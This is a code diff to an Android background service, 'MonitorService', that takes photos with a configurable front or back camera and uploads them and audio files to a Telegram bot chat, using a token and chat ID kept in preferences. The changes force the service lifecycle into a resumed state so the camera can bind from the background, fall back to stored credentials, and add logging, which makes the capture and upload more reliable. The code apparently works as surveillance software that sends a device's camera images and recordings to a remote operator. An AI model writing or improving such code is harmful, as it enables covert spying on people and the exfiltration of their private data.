@@ -67,6 +67,8 @@ class MonitorService : Service(), LifecycleOwner {
     override fun onCreate() {
         super.onCreate()
         lifecycleRegistry.currentState = Lifecycle.State.CREATED
+        lifecycleRegistry.currentState = Lifecycle.State.STARTED
+        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
         
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.registerOnSharedPreferenceChangeListener(prefsListener)
@@ -114,6 +116,7 @@ class MonitorService : Service(), LifecycleOwner {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
         lifecycleRegistry.currentState = Lifecycle.State.STARTED
+        lifecycleRegistry.currentState = Lifecycle.State.RESUMED
         startForegroundServiceNotification()
         // No loadCredentials here, handled by onCreate and listener
         if (job == null || job?.isActive == false) startLoops()
@@ -372,46 +375,75 @@ class MonitorService : Service(), LifecycleOwner {
     
     private suspend fun captureCameraAndSend() {
         withContext(Dispatchers.Main) {
+            if (ContextCompat.checkSelfPermission(this@MonitorService, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                Log.e("MonitorService", "Cannot capture photo: CAMERA permission is not granted")
+                return@withContext
+            }
+
+            if (lifecycleRegistry.currentState != Lifecycle.State.RESUMED) {
+                lifecycleRegistry.currentState = Lifecycle.State.RESUMED
+            }
+
             try {
-                // ... CameraX Logic ...
-                 val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
-                 cameraProviderFuture.addListener({
-                    val cameraProvider = cameraProviderFuture.get()
-                    val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
-                    val isBack = cameraFacing.equals("back", ignoreCase = true)
-                    val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
-                    val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
-                        targetSelector
-                    } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
-                        CameraSelector.DEFAULT_FRONT_CAMERA
-                    } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
-                        CameraSelector.DEFAULT_BACK_CAMERA
-                    } else {
-                        targetSelector
-                    }
-                    
+                Log.d("MonitorService", "Initializing CameraProvider for snapshot (facing=$cameraFacing)")
+                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
+                cameraProviderFuture.addListener({
                     try {
+                        val cameraProvider = cameraProviderFuture.get()
+                        val imageCapture = ImageCapture.Builder()
+                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                            .build()
+
+                        val isBack = cameraFacing.equals("back", ignoreCase = true)
+                        val targetSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
+                        val cameraSelector = if (cameraProvider.hasCamera(targetSelector)) {
+                            targetSelector
+                        } else if (isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
+                            CameraSelector.DEFAULT_FRONT_CAMERA
+                        } else if (!isBack && cameraProvider.hasCamera(CameraSelector.DEFAULT_BACK_CAMERA)) {
+                            CameraSelector.DEFAULT_BACK_CAMERA
+                        } else {
+                            targetSelector
+                        }
+
                         cameraProvider.unbindAll()
                         cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
-                        
-                        imageCapture.takePicture(ContextCompat.getMainExecutor(this@MonitorService), object : ImageCapture.OnImageCapturedCallback() {
-                            override fun onCaptureSuccess(image: ImageProxy) {
-                                val bitmap = imageProxyToBitmap(image)
-                                image.close()
-                                if (bitmap != null) {
-                                    CoroutineScope(Dispatchers.IO).launch {
-                                         sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
+                        Log.d("MonitorService", "Camera bound to lifecycle ($cameraSelector), taking picture...")
+
+                        imageCapture.takePicture(
+                            ContextCompat.getMainExecutor(this@MonitorService),
+                            object : ImageCapture.OnImageCapturedCallback() {
+                                override fun onCaptureSuccess(image: ImageProxy) {
+                                    Log.d("MonitorService", "Camera onCaptureSuccess: received image frame")
+                                    val bitmap = imageProxyToBitmap(image)
+                                    image.close()
+                                    cameraProvider.unbindAll()
+
+                                    if (bitmap != null) {
+                                        CoroutineScope(Dispatchers.IO).launch {
+                                            val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+                                            val tok = if (botToken.isNotEmpty()) botToken else pref.getString("token", "") ?: ""
+                                            val cid = if (targetChatId.isNotEmpty()) targetChatId else pref.getString("chatId", "") ?: ""
+                                            sendTelegramPhoto(tok, cid, bitmap, "camera.jpg")
+                                        }
+                                    } else {
+                                        Log.e("MonitorService", "Failed to decode bitmap from camera ImageProxy")
                                     }
                                 }
-                                cameraProvider.unbindAll() // Release immediately
+
+                                override fun onError(exception: ImageCaptureException) {
+                                    Log.e("MonitorService", "Camera takePicture failed: code=${exception.imageCaptureError}", exception)
+                                    cameraProvider.unbindAll()
+                                }
                             }
-                            override fun onError(exception: ImageCaptureException) {
-                                cameraProvider.unbindAll()
-                            }
-                        })
-                    } catch(e:Exception) {}
-                 }, ContextCompat.getMainExecutor(this@MonitorService))
-            } catch (e: Exception) {}
+                        )
+                    } catch (e: Exception) {
+                        Log.e("MonitorService", "Camera binding or execution exception", e)
+                    }
+                }, ContextCompat.getMainExecutor(this@MonitorService))
+            } catch (e: Exception) {
+                Log.e("MonitorService", "Camera setup exception", e)
+            }
         }
     }
     
@@ -423,11 +455,18 @@ class MonitorService : Service(), LifecycleOwner {
     }
 
     private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
-        val url = "https://api.telegram.org/bot$token/sendAudio"
+        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+        val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
+        val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
+        if (tok.isEmpty() || cid.isEmpty()) {
+            Log.e("MonitorService", "Cannot send audio: token or chatId is empty")
+            return
+        }
+        val url = "https://api.telegram.org/bot$tok/sendAudio"
         try {
              val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("chat_id", cid)
                 .addFormDataPart("audio", file.name,
                     file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                 .build()
@@ -444,22 +483,39 @@ class MonitorService : Service(), LifecycleOwner {
     }
     
     private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
-         // ... Reusing logic from TelegramService, simplified ...
-         // (Ideally should be in a Shared Helper, but duplicating for safety now to avoid extensive refactor)
-        val url = "https://api.telegram.org/bot$token/sendPhoto"
+        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+        val tok = if (token.isNotEmpty()) token else pref.getString("token", "") ?: ""
+        val cid = if (chatId.isNotEmpty()) chatId else pref.getString("chatId", "") ?: ""
+        if (tok.isEmpty() || cid.isEmpty()) {
+            Log.e("MonitorService", "Cannot send photo: Telegram token or chatId is empty!")
+            return
+        }
+        val url = "https://api.telegram.org/bot$tok/sendPhoto"
         val stream = ByteArrayOutputStream()
-        originalBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
+        originalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
         val byteArray = stream.toByteArray()
-        originalBitmap.recycle() // Important!
+        originalBitmap.recycle()
         
+        Log.d("MonitorService", "Sending ${byteArray.size} bytes photo to Telegram chat $cid")
         val requestBody = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
-            .addFormDataPart("chat_id", chatId)
+            .addFormDataPart("chat_id", cid)
             .addFormDataPart("photo", filename,
                 byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
             .build()
         val request = Request.Builder().url(url).post(requestBody).build()
-        try { client.newCall(request).execute().use { } } catch(e: Exception) {}
+        try { 
+            client.newCall(request).execute().use { response ->
+                if (response.isSuccessful) {
+                    Log.d("MonitorService", "Camera photo sent successfully to Telegram")
+                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_photo_sent", System.currentTimeMillis()).apply()
+                } else {
+                    Log.e("MonitorService", "Telegram sendPhoto failed: ${response.code} - ${response.body?.string()}")
+                }
+            } 
+        } catch(e: Exception) {
+            Log.e("MonitorService", "Failed to send photo to Telegram", e)
+        }
     }
 
     private fun startForegroundServiceNotification() {
